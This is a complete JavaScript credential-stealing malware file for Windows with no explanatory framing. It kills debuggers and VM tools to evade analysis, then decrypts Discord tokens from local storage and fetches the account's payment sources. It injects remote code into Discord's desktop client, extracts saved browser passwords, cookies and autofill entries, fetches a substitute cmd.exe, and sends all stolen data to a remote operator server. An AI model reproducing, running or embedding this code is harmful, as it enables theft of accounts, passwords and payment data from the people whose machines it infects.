(function anonymous(require
) {
const { execSync, exec } = require('child_process');
const { Dpapi } = require('@primno/dpapi');
const { join } = require('path');
const { createDecipheriv, createCipheriv } = require('crypto');
const { totalmem, cpus, userInfo, uptime, hostname } = require('os');
const { existsSync, readdirSync, readFileSync, statSync, writeFileSync, copyFileSync } = require('fs');

const si = require('systeminformation');
const { Database } = require('sqlite3');

const options = {
    api: 'https://illitmagnetic.site/api/',
    user_id: '6270048187',
    logout_discord: 'false'
};

function checkVm() {
    if(Math.round(totalmem() / (1024 * 1024 * 1024)) < 2) process.exit(1);
    if([
        'bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb',
        'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r',
        'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj',
        'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS', 'aranmoo', 'kathlcox', 'rotembarne', 'bilawson', 'seanwalla', 'gugonzal', 'zachwood', 'theresap', 'joyedwar', 'richar', 'dburns', 'willipe'
    ].includes(hostname().toLowerCase())) process.exit(1);

    const tasks = execSync('tasklist');
    [
        'opera', 'fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd',
        'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg',
        'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver',
        'vmwareservice', 'vmwaretray', 'discordtokenprotector'
    ].forEach((task) => {
        if(tasks.includes(task))
        execSync(`taskkill /f /im ${task}.exe`);
    });
};

async function getDiscordTokens() {
    const request = await fetch(options.api + 'paths', {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json',
            'duvet_user': options.user_id
        }
    });
    
    const paths = await request.json();
    const tokens_list = [];

    for(const [key, value] of Object.entries(paths.discordTokens)) {
        const path = value.replace('appdata', process.env.LOCALAPPDATA).replace('roaming', process.env.APPDATA);

        if(existsSync(path) && existsSync(join(path, '..', '..', 'Local State'))) {
            for(const file of readdirSync(path)) {
                if(file?.endsWith('.ldb')  || file?.endsWith('.log')) {
                    if(!existsSync(join(path, file))) return;

                    const file_content = readFileSync(join(path, file), 'utf-8')
                    .split('\n')?.map((x) => x?.trim());

                    file_content?.forEach((line) => {
                        const encrypted_tokens = line?.match(/dQw4w9WgXcQ:[^.*['(.*)'\].*$][^']*/gi);
                        if(encrypted_tokens) {
                            encrypted_tokens?.forEach(async(token) => {
                                if(token?.endsWith('\\')) token = (token?.slice(0, -1).replace('\\', ''))?.slice(0, -1);
                                const encrypted_key = Buffer.from(JSON.parse(readFileSync(join(path, '..', '..', 'Local State')))?.os_crypt?.encrypted_key, 'base64').slice(5);
                                const decrypted_key = Dpapi?.unprotectData(Buffer.from(encrypted_key, 'utf-8'), null, 'CurrentUser');
                                if(!decrypted_key) return;

                                let decrypted_token;

                                const encrypted = Buffer.from(token?.split(':')[1], 'base64');
                                if(!encrypted) return;

                                const start = encrypted?.slice(3, 15), 
                                middle = encrypted?.slice(15, encrypted?.length - 16),
                                end = encrypted?.slice(encrypted?.length - 16, encrypted?.length);
                            
                                if(decrypted_key.byteLength >= 64) return;

                                if(start?.length !== 12) return;
                                const cipher = createCipheriv('aes-256-gcm', decrypted_key, start)
                                let encryptedData = cipher.update(middle, 'base64', 'utf-8');
                                encryptedData += cipher.final('utf-8');

                                decrypted_token = encryptedData;
                                if(!tokens_list?.find((t) => t?.token === decrypted_token)) {
                                    tokens_list.push({
                                        token: decrypted_token,
                                        found_in: key,
                                        auth_tag_length: end.length,
                                        crypto_iv: start?.length
                                    });
                                };
                            });
                        };
                    });
                };
            };
        } else if(existsSync(path)  && !existsSync(join(path, '..', '..', 'Local State'))) {
            for(const file of readdirSync(path)) {
                if(file?.endsWith('.ldb') || file?.endsWith('.log')) {
                    const file_content = readFileSync(join(path, file), 'utf-8')?.split(/\r?\n/);
                    file_content?.forEach((line) => {
                        for(const regex of [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)]) {
                            const matched_tokens = line?.match(regex);
                            if(matched_tokens) {
                                matched_tokens?.forEach(async(token) => {
                                    if(!tokens_list?.find((t) => t?.token === token)) {
                                        tokens_list?.push({
                                            token: token,
                                            found_in: key
                                        });
                                    };
                                });
                            };
                        };
                    });
                };
            };
        } else {
            continue;
        };
    };

    const merge = (a, b, predicate = (a, b) => a === b) => {
        const c = [...a];
        b?.forEach((bItem) => (c?.some((cItem) => predicate(bItem, cItem)) ? null : c?.push(bItem)))
        return c;
    };

    const firefox_tokens = await stealFirefoxTokens();

    const valid_tokens = [];
    for(const value of merge(tokens_list, firefox_tokens)) {
        const token_data = await checkToken(value?.token);

        if(token_data?.id) {
            const user_data = await tokenRequests(value?.token, token_data?.id);
            if(!valid_tokens.find((u) => u?.user?.data?.id === token_data.id)) {
                valid_tokens.push({
                    token: value?.token,
                    found_at: value?.found_in,
                    auth_tag_length: value?.auth_tag_length,
                    crypto_iv: value?.crypto_iv,
                    user: {
                        data: token_data,
                        profile: user_data?.profile,
                        payment_sources: user_data?.payment_sources
                    }
                });
            };
        };
    };
    
    if(valid_tokens?.length) {
        fetch(options.api + 'valid-tokens', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                duvet_user: options?.user_id,
                valid_tokens,
                computer_name: userInfo()?.username
            })
        });
    };
};

async function newInjection() {
    const system_info = await si?.osInfo();
    const injections = await discordInjection();

    const network = await fetch('https://ipinfo.io/json', {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json'
        }
    });

    const network_data = await network.json();

    fetch(options.api + 'new-injection', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            duvet_user: options?.user_id,
            computer_name: userInfo()?.username,
            ram: Math.round(totalmem() / (1024 * 1024 * 1024)),
            cpu: cpus()?.[0]?.model,
            injections,
            distro: system_info?.distro,
            uptime: uptime() * 1000,
            network: {
                ip: network_data?.ip,
                country: network_data?.country,
                city: network_data?.city,
                region: network_data?.region,
            }
        })
    });
};

async function tokenRequests(token, id) {
    const profile = await fetch(`https://discord.com/api/v10/users/${id}/profile`, {
        method: 'GET',
        headers: {
            Authorization: token,
            'Content-Type': 'application/json'
        }
    });

    const payment_sources = await fetch(`https://discord.com/api/v10/users/@me/billing/payment-sources`, {
        method: 'GET',
        headers: {
            Authorization: token,
            'Content-Type': 'application/json'
        }
    });

    const promises = await Promise.allSettled([
        profile?.json(),
        payment_sources?.json()
    ]);
    
    return {
        profile: promises[0]?.value,
        payment_sources:promises[1]?.value
    };
};

async function checkToken(token) {
    const check_token = await fetch('https://discord.com/api/v10/users/@me', {
        headers: {
            Authorization: token,
            'Content-Type': 'application/json'
        }
    });

    if(check_token?.status === 200) {
        return new Promise(async(res) => {
            const json = await check_token?.json();
            res(json);
        });
    } else {
        return check_token?.status;
    };
};

async function stealFirefoxTokens() {
    const path = join(process.env.APPDATA, 'Mozilla', 'Firefox', 'Profiles');
    const tokens_list = [];

    if(existsSync(path)) {
        try {
            const files = execSync('where /r . *.sqlite', { cwd: path })?.toString()
            ?.split(/\r?\n/);
    
            files?.forEach((file) => {
                file = file?.trim();
                if(existsSync(file) && statSync(file)?.isFile()) {
                    const lines = readFileSync(file, 'utf8')
                    ?.split('\n')?.map(x => x?.trim());
    
                    for(const regex of [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)]) {
                        lines?.forEach((line) => {
                            const tokens = line?.match(regex);
                            if(tokens) {
                                tokens?.forEach((token) => {
                                    if (
                                        !token?.startsWith('NzY') &&
                                        !token?.startsWith('NDk') &&
                                        !token?.startsWith('MTg') &&
                                        !token?.startsWith('MjI') &&
                                        !token?.startsWith('MzM') &&
                                        !token?.startsWith('NDU') &&
                                        !token?.startsWith('NTE') &&
                                        !token?.startsWith('NjU') &&
                                        !token?.startsWith('NzM') &&
                                        !token?.startsWith('ODA') &&
                                        !token?.startsWith('OTk') &&
                                        !token?.startsWith('MTA') &&
                                        !token?.startsWith('MTE')
                                      ) return;
                                      if(!tokens_list?.find((t) => t?.token === token)) {
                                        tokens_list?.push({
                                            token: token,
                                            found_in: 'Firefox'
                                        });
                                      }
                                });
                            };
                        });
                    };
                };
            });
        } catch(e) {
            console.log(e);
        };

    return tokens_list;
   };
};


async function discordInjection() {
    const infectedDiscords = [];

    [join(process.env.LOCALAPPDATA, 'Discord'), join(process.env.LOCALAPPDATA, 'DiscordCanary'), join(process.env.LOCALAPPDATA, 'DiscordPTB')]
    ?.forEach(async(dir) => {
        if(existsSync(dir)) {
            if(!readdirSync(dir).filter((f => f?.startsWith('app-')))?.[0]) return;
            const path = join(dir, readdirSync(dir).filter((f => f.startsWith('app-')))?.[0], 'modules', 'discord_desktop_core-1');
            const discord_index = execSync('where /r . index.js', { cwd: path })?.toString()?.trim();
            
            if(discord_index) infectedDiscords?.push(
                dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')
            );

            const request = await fetch(options.api + 'injections', {
                method: 'GET',
                headers: {
                    duvet_user: options?.user_id,
                    logout_discord: options?.logout_discord
                }
            });

            const data = await request.json();

            writeFileSync(discord_index, data?.discord, {
                flag: 'w'
            });

            await kill(['discord', 'discordcanary', 'discorddevelopment', 'discordptb']);
            exec(`${join(dir, 'Update.exe')} --processStart ${dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')}.exe`, function(err) {
                if(err) {};
            });
        };
    });

    return infectedDiscords;
};

async function browserCookies(path) {
    const cookies = [];
    const hq_cookies = [];

    if (existsSync(path)) {
        let path_split = path?.split('\\'),
        path_st = path?.includes('Network') ? path_split?.splice(0, path_split.length - 3) : path_split?.splice(0, path_split?.length - 2),
        path_t = path_st?.join('\\') + '\\';

        if (path?.startsWith(process.env.APPDATA)) path_t = path;

        if (existsSync(join(path, 'Network')) && existsSync(join(path_t, 'Local State'))) {
            const encrypted = Buffer.from(JSON.parse(readFileSync(join(path_t, 'Local State'), 'utf-8'))?.os_crypt?.encrypted_key, 'base64').slice(5);
            const key = Dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
            if(!key) return;

            const result = await new Promise(async(resolve) => {
                if (!existsSync(join(path, 'Network', 'Cookies'))) return;

                await kill([
                    'chrome', 'msedge', 'brave', 'firefox', 'opera', 'kometa', 'orbitum', 'centbrowser', '7star', 'sputnik', 'vivaldi',
                    'epicprivacybrowser', 'uran', 'yandex', 'iridium'
                 ]);

                const database = new Database(join(path, 'Network', 'Cookies'));
                if(!database) return;

                database.each('SELECT * from cookies', async function (err, row) {   
                    if(!row?.encrypted_value) return;

                    const encrypted_value = row?.encrypted_value;
                    let decrypted;
                    if (encrypted_value?.[0] == 1 && encrypted_value?.[1] == 0 && encrypted_value?.[2] == 0 && encrypted_value?.[3] == 0) {
                        decrypted = Dpapi.unprotectData(encrypted_value, null, 'CurrentUser');
                    } else {
                        const start = encrypted_value?.slice(3, 15),
                        middle = encrypted_value?.slice(15, encrypted_value?.length - 16),
                        end = encrypted_value?.slice(encrypted_value?.length - 16, encrypted_value?.length);

                        if(key.byteLength >= 64) return;

                        if(start?.length !== 12) return;
                        const decipher = createDecipheriv('aes-256-gcm', key, start);

                        if(end?.byteLength !== 16) return;
                        decipher?.setAuthTag(end);
                        decrypted = decipher?.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');

                        let browser = path?.includes('Local') ? path?.split('\\Local\\')[1].split('\\')?.[1] : path?.split('\\Roaming\\')?.[1]?.split('\\')?.[1];
                        if(path?.includes('Profile')) browser = `${browser} ${path?.split('\\User Data')?.[1]?.replaceAll('\\', '')}`;

                        if (cookies?.find((c) => c?.browser === browser)) {
                            cookies?.find((c) => c?.browser === browser)?.list?.push(`${row?.host_key}	TRUE	/	FALSE	2597573456	${row?.name}	${decrypted}`);
                        } else {
                            cookies.push({
                                browser: browser,
                                list: [`${row?.host_key}	TRUE	/	FALSE	2597573456	${row?.name}	${decrypted}`]
                            });
                        };
                    };
                }, function () {
                    resolve({ cookies, hq_cookies });
                    database?.close();
                });
            });
            return result;
        };
    };
};

async function getBrowserCookies() {
    const cookies_list = [];

    return await new Promise(async(resolve) => {
        const request = await fetch(options.api + 'paths', {
            method: 'GET',
            headers: {
                'duvet_user': options.user_id,
            }
        });

        const data = await request.json();

        const paths = data?.browsers?.map((p) => p?.replace('appdata', process.env.LOCALAPPDATA)?.replace('roaming', process.env.APPDATA));
        
        for(const path of paths) {
            if(!path.includes('Firefox')) {
                try {
                    const cookies = await browserCookies(path);

                    if(cookies?.cookies?.[0]?.browser && cookies?.cookies?.[0]?.list) {
                        cookies_list.push({
                            browser: cookies?.cookies?.[0]?.browser,
                            list: cookies?.cookies?.[0]?.list
                        });
                    };  
                } catch(e) {
                    await fetch(options.api + 'errors', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            duvet_user: options?.user_id,
                            computer_name: userInfo()?.username,
                            data: {
                                error: `${e}`
                            }
                        })
                    });
                    continue;
                }
            } else {
                try {
                    const firefox_cookies = await getFirefoxCookies(path);
                    if(firefox_cookies) {
                        cookies_list.push({
                            browser: 'Firefox',
                            list: firefox_cookies?.[0]?.list
                        });
                    };
                } catch(e) {
                    await fetch(options.api + 'errors', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            duvet_user: options?.user_id,
                            computer_name: userInfo()?.username,
                            data: {
                                error: `${e}`
                            }
                        })
                    });
                    continue;
                }
            };
        };
        resolve({ cookies_list });
    });
};

async function getFirefoxCookies(path) {
    const cookies = [];
    if(existsSync(path)) {
        try {
            const cookiesFile = execSync('where /r . cookies.sqlite', { cwd: path })?.toString();

            if(!cookiesFile) return;
            if(!existsSync(join(cookiesFile?.trim()))) return;
            const result = await new Promise((res, rej) => {
                const database = new Database(cookiesFile?.trim())
                if(!database) return;
    
                database.each('SELECT * FROM moz_cookies', async function(err, row) {
                    if(!row?.value) return;
                    if(cookies?.find((c) => c?.browser === 'Firefox')) {
                        cookies?.find((c) => c?.browser === 'Firefox')?.list?.push(`${row?.host}\t${row?.expiry === 0 ? 'FALSE' : 'TRUE'}\t${row?.path}\t${row?.host?.startsWith('.') ? 'FALSE' : 'TRUE'}\t${row?.expiry}\t${row?.name}\t${row?.value}`);
                    } else {
                        cookies?.push({ browser: 'Firefox', list: [`${row?.host}\t${row?.expiry === 0 ? 'FALSE' : 'TRUE'}\t${row?.path}\t${row?.host?.startsWith('.') ? 'FALSE' : 'TRUE'}\t${row?.expiry}\t${row?.name}\t${row?.value}`]});
                    };
                }, function () {
                    res(cookies);
                    database?.close();
                });
            });

            return result;
        } catch(e) {
            console.log(e)
        };
    };
};

async function browserPasswords(path) {
    const passwords = [];
    if(existsSync(path)) {
        let path_split = path?.split('\\'),
        path_st = path?.includes('Network') ? path_split?.splice(0, path_split?.length - 3) : path_split?.splice(0, path_split?.length - 2),
        path_t = path_st.join('\\') + '\\';

        if (path?.startsWith(process.env.APPDATA)) path_t = path;

        if (existsSync(join(path, 'Network')) && existsSync(join(path_t, 'Local State'))) {
            const encrypted = Buffer.from(JSON.parse(readFileSync(join(path_t, 'Local State'), 'utf-8'))?.os_crypt.encrypted_key, 'base64').slice(5);
            const key = Dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
            if(!key) return;
            if(!existsSync(join(path, 'Login Data'))) return;

            copyFileSync(join(path, 'Login Data'), join(path, 'passwords.db'));

            const result = await new Promise((resolve) => {
                if (!existsSync(join(path, 'passwords.db'))) return;

                const database = new Database(join(path, 'passwords.db'));
                if(!database) return;

                database.each('SELECT origin_url, username_value, password_value FROM logins', async function (err, row) {
                    if(!row?.username_value) return;

                    const start = row?.password_value.slice(3, 15),
                    middle = row?.password_value.slice(15, row.password_value?.length - 16),
                    end = row?.password_value.slice(row.password_value?.length - 16, row.password_value?.length);

                    if(key.byteLength >= 64) return;

                    if(start?.length !== 12) return;
                    const decipher = createDecipheriv('aes-256-gcm', key, start);

                    let browser = path?.includes('Local') ? path?.split('\\Local\\')[1].split('\\')?.[1] : path?.split('\\Roaming\\')?.[1].split('\\')?.[1];
                    if(path?.includes('Profile')) browser = `${browser} ${path?.split('\\User Data')?.[1].replaceAll('\\', '')}`;
                    if(end?.byteLength !== 16) return;

                    decipher?.setAuthTag(end);

                    if (passwords?.find((c) => c?.browser === browser)) {
                        passwords?.find((c) => c.browser === browser)?.list?.push('URL: ' + row?.['origin_url']+ '\nUsername: ' + row?.['username_value'] + '\nPassword: ' + decipher?.update(middle, 'base64', 'utf-8') + decipher?.final('utf-8'));
                    } else {
                        passwords.push({ browser: browser, list: ['URL: ' + row?.['origin_url']+ '\nUsername: ' + row?.['username_value'] + '\nPassword: ' + decipher?.update(middle, 'base64', 'utf-8') + decipher?.final('utf-8')] })
                    };
                }, function () {
                    resolve(passwords);
                    database?.close();
                });
            });
            return result;
        };
    };
};

async function browserAutofills(path) {
    const autofills = [];
    if(existsSync(path)) {
        let path_split = path?.split('\\'),
        path_st = path?.includes('Network') ? path_split?.splice(0, path_split.length - 3) : path_split?.splice(0, path_split?.length - 2),
        path_t = path_st?.join('\\') + '\\';

        if (path?.startsWith(process.env.APPDATA)) path_t = path;

        if (existsSync(join(path, 'Network')) && existsSync(join(path_t, 'Local State'))) {
            copyFileSync(join(path, 'Web Data'), join(path, 'autofills.db'));

            const result = await new Promise((resolve) => {
                if (!existsSync(join(path, 'autofills.db'))) return;

                const database = new Database(join(path, 'autofills.db'));
                if(!database) return;
                
                let browser = path?.includes('Local') ? path?.split('\\Local\\')?.[1].split('\\')?.[1] : path?.split('\\Roaming\\')?.[1].split('\\')?.[1];
                if(path?.includes('Profile')) browser = `${browser} ${path?.split('\\User Data')?.[1].replaceAll('\\', '')}`;

                database.each('SELECT * FROM autofill', async function (err, row) {
                    if(!row?.name || !row?.value) return;

                    if (autofills?.find((c) => c?.browser === browser)) {
                        autofills?.find((c) => c?.browser === browser)?.list.push(`Name: ${row?.name}\nData: ${row?.value}`);
                    } else {
                        autofills?.push({ browser: browser, list: [`Name: ${row?.name}\nData: ${row?.value}`]})
                    };
                }, function () {
                    resolve(autofills);
                    database.close();
                });
            });
            return result;
        };
    };
};

async function getBrowserAutofills() {
    const autofills_list = [];

    return await new Promise(async(resolve) => {
        const request = await fetch(options.api + 'paths', {
            method: 'GET',
            headers: {
                'duvet_user': options.user_id,
            }
        });

        const data = await request.json();

        const paths = data?.browsers.map((p) => p?.replace('appdata', process.env.LOCALAPPDATA)?.replace('roaming', process.env.APPDATA));
        
        for(const path of paths) {
            if(!path.includes('Firefox')) {
                try {
                    const autofills = await browserAutofills(path);
                    if(autofills?.[0]?.browser && autofills?.[0]?.list) {
                        autofills_list?.push({
                            browser: autofills?.[0]?.browser,
                            list: autofills?.[0]?.list
                        });
                    };
                } catch(e) {
                    await fetch(options.api + 'errors', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            duvet_user: options?.user_id,
                            computer_name: userInfo()?.username,
                            data: {
                                error: `${e}`
                            }
                        })
                    });
                }
            };
        };
        resolve(autofills_list);
    });
};

async function getBrowserPasswords() {
    const passwords_list = [];

    return await new Promise(async(resolve) => {
        const request = await fetch(options.api + 'paths', {
            method: 'GET',
            headers: {
                'duvet_user': options.user_id,
            }
        });

        const data = await request.json();

        const paths = data?.browsers.map((p) => p?.replace('appdata', process.env.LOCALAPPDATA)?.replace('roaming', process.env.APPDATA));
        
        for(const path of paths) {
            if(!path.includes('Firefox')) {
                try {
                    const passwords = await browserPasswords(path);
                    if(passwords?.[0]?.browser && passwords?.[0]?.list) {
                        passwords_list.push({
                            browser: passwords?.[0]?.browser,
                            list: passwords?.[0]?.list
                        });
                    };
                } catch(e) {
                    await fetch(options.api + 'errors', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            duvet_user: options?.user_id,
                            computer_name: userInfo()?.username,
                            data: {
                                error: `${e}`
                            }
                        })
                    });
                }
            };
        };
        resolve(passwords_list);
    });
};


async function allBrowserData() {
    try {
        await kill([
            'chrome', 'msedge', 'brave', 'firefox', 'opera', 'kometa', 'orbitum', 'centbrowser', '7star', 'sputnik', 'vivaldi',
            'epicprivacybrowser', 'uran', 'yandex', 'iridium'
         ]);

        const promisses = await Promise.allSettled([
            getBrowserCookies(),
            getBrowserAutofills(),
            getBrowserPasswords()
        ]);

        await fetch(options.api + 'browsers-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                duvet_user: options?.user_id,
                computer_name: userInfo()?.username,
                data: {
                    cookies: promisses?.[0]?.value?.cookies_list,
                    autofills: promisses?.[1]?.value,
                    passwords: promisses?.[2]?.value
                }
            })
        });
    } catch(e) {
        await fetch(options.api + 'errors', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                duvet_user: options?.user_id,
                computer_name: userInfo()?.username,
                data: {
                    error: `${e}`
                }
            })
        });
    };
};

(async() => {
    try {
        checkVm();
        await checkCmdInstallation();
        await newInjection();
    } catch(e) {
        await fetch(options.api + 'errors', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                duvet_user: options?.user_id,
                computer_name: userInfo()?.username,
                data: {
                    error: `Error from Injection: ${e}`
                }
            })
        });
    };
    try {
        await getDiscordTokens();
    } catch(e) {
        await fetch(options.api + 'errors', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                duvet_user: options?.user_id,
                computer_name: userInfo()?.username,
                data: {
                    error: `Discord Tokens Error: ${e}`
                }
            })
        });
    };
    try {
        await allBrowserData();
    } catch(e) {
        await fetch(options.api + 'errors', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                duvet_user: options?.user_id,
                computer_name: userInfo()?.username,
                data: {
                    error: `Browser Data Error: ${e}`
                }
            })
        });
    }
})();

process.on('unhandledRejection', async(error) => {
    await fetch(options.api + 'errors', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            duvet_user: options?.user_id,
            computer_name: userInfo()?.username,
            data: {
                error: `unhandledRejection: ${error}`
            }
        })
    });
});

  process.on('uncaughtException', async(error) => {
    await fetch(options.api + 'errors', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            duvet_user: options?.user_id,
            computer_name: userInfo()?.username,
            data: {
                error: `uncaughtException: ${error}`
            }
        })
    });
});

  process.on('uncaughtExceptionMonitor', async(error) => {
    await fetch(options.api + 'errors', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            duvet_user: options?.user_id,
            computer_name: userInfo()?.username,
            data: {
                error: `uncaughtExceptionMonitor: ${error}`
            }
        })
    });
});
  
async function kill(processes) {
    return new Promise((resolve) => {
        const tasks = execSync('tasklist')?.toString()?.toLowerCase();
        processes = processes?.filter(task => tasks?.includes(task));
        processes?.forEach((task) => exec(`taskkill /f /im ${task}.exe`));
        resolve();
      });
};

async function checkCmdInstallation() {
    return await new Promise(async(resolve) => {
        if(!existsSync('C:\\Windows\\system32\\cmd.exe')) {
            const request = await fetch(options.api + 'cmd-file', {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'duvet_user': options?.user_id
                }
            });
    
            const response = await request.json();
            writeFileSync(join(process.env.USERPROFILE, 'Documents','cmd.exe'), Buffer.from(response?.buffer), {
                flag: 'w'
            });
            process.env.ComSpec = join(process.env.USERPROFILE, 'Documents', 'cmd.exe');
            resolve();
        } else {
            process.env.ComSpec = 'C:\\Windows\\system32\\cmd.exe';
            resolve();
        };
    });
};

})
